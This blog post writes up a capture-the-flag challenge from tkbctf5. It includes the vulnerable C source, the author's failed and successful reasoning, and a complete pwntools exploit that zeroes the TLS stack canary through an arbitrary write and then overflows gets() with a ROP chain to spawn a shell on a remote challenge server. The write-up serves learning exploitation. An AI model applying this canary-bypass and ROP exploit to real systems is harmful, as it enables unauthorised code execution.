---
title: "TkbCTF 5: Stack BOF Pwn Challenge Writeup"
date: 2026-03-20
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "tkbctf"
  - "tkbctf5"
  - "binary exploitation"
  - "reverse-engineering"
---

For this week's pwn challenge, I have decided to continue with an online CTF. Trying to solve a challenge during a CTF is definitely more engaging and entertaining. Unfortunately, I couldn't make it in time for a live one, but I found some great challenges still active in tkbctf5: <https://alpacahack.com/ctfs/tkbctf5/challenges/stack-bof>

I wanted start with easier ones with most solves, thinking I could maybe fit two challenges into this week's post. Oh boy, I was so wrong. First challenge I looked at was so simple and easy, but it took me days of research and debugging to finally crack it, leaving no time for a second challenge. I am happy that it did push me to research more, I ended up learning new stuff. I am always grateful of challenges that teaches me new stuff I had no idea before. Let's dive into this week's challenge.

## Initial Analysis

Challenge provides the source code for our initial look. Looking at the main function, it is quite a short and simple code.

```c++
int main() {
  char buf[8];
  uint64_t* dest = 0;
  printf("printf: %p\n", printf);
  
  read(0, &dest, 8);
  read(0, dest, 8);

  gets(buf);
}
```

Looks quite simple, isn't it? There isn't much complexity we need to figure out, it has few obvious attack surfaces:

1. printf's address from libc is printed. This can be used to find libc base address.
2. Gets buffer overflow
3. Write-what-where Condition using the double read. First read receives an address from user, and second read writes user input to that address. So we are given an arbitrary write.

It also sounds quite simple, isn't it? Now here comes the bad part, looking at security flags, binary has everything enabled that can be seen both from the compile command in the source and checksec output:

```
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Why is this a problem? Looking at the weaknesses, there is a buffer overflow we can use to ROP around if we know the stack canary, and the code base and libc base. That is technically three unknowns, where we only know one of them: libc base by using printf's provided address. I don't see a way to leak stack canary, or the code base. Now it starts to look more challenging. 

## Failed Attempt: __stack_chk_fail

There is a buffer overflow, we know that. At this point my thought was, what if we intentionally overflow to trigger __stack_chk_fail call? By using the arbitrary write, I thought maybe we can overwrite the __stack_chk_fail call in libc to do something else. I think it was a reasonable idea, but unfortunately it didn't work.

I actually spent quite a lot of time on this trying to make it work and failing to understand why it wasn't working. So I think it deserves a mention on this post for the readers so that they don't fall into the same rabbit hole. 

Once the printf address is leaked, and we received the libc base, finding the address of __stack_chk_fail was straightforward:
 
```python
# Both the remote server and my local machine had the same 3 nibble offset
# for printf's random address: 0x....100 so this indicated to me that 
# probably we are using the same libc version. I didn't have to guess
# which libc version it was using. Worst case scenario, we could 
# probably find it out by looking at the provided docker file and which
# ubuntu version it is using etc.

libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc_elf = ELF(libc)

p.recvuntil(b'printf: 0x')
print_leak = int(p.recvline().strip(), 16)
libc_elf.address = print_leak - libc_elf.symbols['printf']

print(hex(libc_elf.symbols['__stack_chk_fail']))
```

I briefly mentioned how I decided to use local libc version for analysis in the comments above. Rest is simple, read the leak and update libc base address. But no matter what I tried I couldn't modify the data in __stack_chk_fail's address. Reason was simple **when .text section of the library is loaded they are loaded as read only which can't be changed!** Quite a lot of time was spent on this, at least I learned something.

## Working Solution

Okay we can't really do anything with __stack_chk_fail. What do we do? If we can't leak stack canary, we can't overflow and ROP and it seems there is no way to leak it. **What if we overwrite the expected value of stack canary?** Since we have an arbitrary write, if we could overwrite the expected stack canary value, and the overflow to canary in stack with the same value, stack canary check will pass! Sounds simple, but where is actually expected stack canary value is stored?

I have done a lot of back and forth with Claude to understand this part. But to be honest, I should have given more attention to the assembly code, it is clearly visible there:

![FS](/assets/img/stackbof_fs.png)

Looking at highlighted region, a local variable storing stack canary is initialized by reading from *(FS + 0x28) roughly. Looking at different binaries, you will see the same pattern in assembly and decompiled code. So we need to understand FS.

> FS is a segment register on x86/x86-64. In Linux userspace (64-bit), the OS repurposes it as a pointer to thread-local storage (TLS).
{: .prompt-info }

Okay, so TLS is generated per thread, and initialized in memory as a local storage. One of the global variables stored in this memory region is stack guard: __stack_chk_guard. Claude actually insisted on me to look for this symbol within libc itself initially. I think the way I understand is that until certain glibc version, this was a global variable within libc itself. But upon looking at the libc version I have, I couldn't locate this. So it is part of TLS now I believe. 

Alright, FS+0x28 must be the location of global stack canary variable that is read by the functions in current thread if FS is pointing to TLS. But how do we know the address of TLS? That is the neat part, we don't need to! The way TLS is initialized and then external libraries are loaded is a deterministic step: **After TLS is set up, ld.so loads shared libraries using DFS (depth-first search) on the dependency graph.** What this means is, at each run TLS and libc will be at a random location, but each time there will be a fixed offset between TLS and libc base! **That means if we know the libc base we can find the TLS/stack canary storage point!!!**

Let's prove this by looking at leaked libc base and where stack canary is read from by debugging by breaking at `*main+12`:

![Canary address](/assets/img/stackbof_canary.png)

In this picture you can see where FS+0x28 is and what is the stack canary value stored there in the debug screen. In this run, libc base address was at 0x7f15c8880000 and the address we see for stack canary is at 0x7f15c887d768. Now if we do this for few different run:

```
0x7f15c8880000 - 0x7f15c887d768 = 0x2898
0x7fd9dbb37000 - 0x7fd9dbb34768 = 0x2898
0x7ffb2e653000 - 0x7ffb2e650768 = 0x2898
```

It looks like there is always a fixed offset between where the stack canary is stored and where the libc is loaded at. Since we can get libc base from printf leak, by using this offset we can now reach where the stack canary is stored. Once we find this, solving this challenge becomes much easier:

1. Get the libc base from printf leak.
2. For first read function, send the address of `libc_base - 0x2898`
3. For second read function, send known data, for example 0x00*8 to set stack canary to zero.
4. Overflow `gets` with the known stack canary, and ROP for shell. 

## Final Code

I think rest of the code is pretty straightforward. And I repeated similar shells with ROP in few different challenges in the past, so I don't see much value going over them here again. One thing to note that could be important is **you might need to pad your system call with a ret instruction to avoid stack alignment issues since this challenge is using a modern version of libc.** It is a simple ret instruction address attached to payload before calling system: `p64(ret_addr) + p64(system)`. Here is the full code for reference with some additional comments:

```python
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']
# context.log_level = 'debug'

# Both the remote server and my local machine had the same 3 nibble offset
# for printf's random address: 0x....100 so this indicated to me that 
# probably we are using the same libc version. I didn't have to guess
# which libc version it was using. Worst case scenario, we could 
# probably find it out by looking at the provided docker file and which
# ubuntu version it is using etc.
exe  = './stack-bof'
libc = '/lib/x86_64-linux-gnu/libc.so.6'


context.binary = exe
elf = ELF(exe)
libc_elf = ELF(libc)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        p = remote('34.170.146.252', 62447)
        return p
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b *main+12
b *main+154
'''.format(**locals())


p = start()

# Receive the leaked printf address
p.recvuntil(b'printf: 0x')
print_leak = int(p.recvline().strip(), 16)
libc_elf.address = print_leak - libc_elf.symbols['printf']

print(hex(print_leak))
print(f'libc base: {hex(libc_elf.address)}')

# Now this offset points to FS+0x28 where the actual value
# of stack canary is stored in TLS. And with the second read
# call we set its value to zero
p.send(p64(libc_elf.address - 0x2898))
p.send(p64(0))

# Now overflow the buffer. Note that we use an extra ret instruction
# attached to payload to fix stack alignment issues. 
rop = ROP(libc_elf)
ret_addr        = rop.find_gadget(['ret'])[0] 
poprdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]    

system = libc_elf.symbols['system']
binsh  = next(libc_elf.search(b'/bin/sh'))

# Here we are sending 8 bytes of zeros for the stack canary, 8*A to RBP and then ROP chain
# Store /bin/sh string address in RDI register to call system('/bin/sh')
payload = b'A' * 8 + b'\x00' * 8 + b'A'*8 
payload += p64(poprdi_ret_addr) + p64(binsh)
payload += p64(ret_addr) + p64(system)
p.sendline(payload)

p.interactive()
```

Overall simple but challenging binary if you don't know the critical TLS detail. I am still surprised that TLS ends up at a fixed offset to libc in all the runs. I guess if the loading of libraries are deterministic, it will always end up in the same order and position. Nevertheless, it was quite fun debugging and figuring out how to use the arbitrary write even though I ended up in a wrong rabbit hole. In the end, I learned something new, that is what all matters, always learning and growing! With that being said, I will see you in the next one, as always keep learning!
